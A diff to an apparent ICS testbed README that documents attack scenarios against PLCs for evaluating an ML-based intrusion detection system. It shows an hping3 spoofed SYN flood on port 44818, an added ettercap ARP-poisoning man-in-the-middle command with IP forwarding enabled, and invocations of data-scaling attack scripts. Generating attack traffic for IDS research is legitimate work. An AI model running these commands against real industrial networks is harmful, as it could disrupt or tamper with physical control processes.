@@ -61,6 +61,10 @@ IP to nodes mapping: PLC1 <--> 10.0.0.1, PLC2 <--> 10.0.0.2, PLC3 <--> 10.0.0.3,
 
     hping3 -S -a 10.0.0.4 --flood -V -p 44818 10.0.0.1
 
+**Note**: Attacks 6 till 23 are MitM attacks. Attacker node is placed b/w two nodes and ip forwarding enabled using the following commands.
+
+    ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// &
+    echo 1 > /proc/sys/net/ipv4/ip_forward
 
 **Attack scenario 6,7,8** (MitM/Data tampering): Run the following commands for attacks 6, 7, 8 respectively.
 
@@ -85,12 +89,12 @@ IP to nodes mapping: PLC1 <--> 10.0.0.1, PLC2 <--> 10.0.0.2, PLC3 <--> 10.0.0.3,
 
 **Attack scenario 18,19,20 (MitM/Scaling positive) and Attack scenario 21,22,23 (MitM/Scaling negative)
 
-python attack_randomp.py PLC2
-python attack_randomp.py PLC3
-python attack_randomp.py BOTH
-python attack_randomn.py PLC2
-python attack_randomn.py PLC3
-python attack_randomn.py BOTH
+    python attack_randomp.py PLC2
+    python attack_randomp.py PLC3
+    python attack_randomp.py BOTH
+    python attack_randomn.py PLC2
+    python attack_randomn.py PLC3
+    python attack_randomn.py BOTH
 
 **Running ML-based IDS**
 
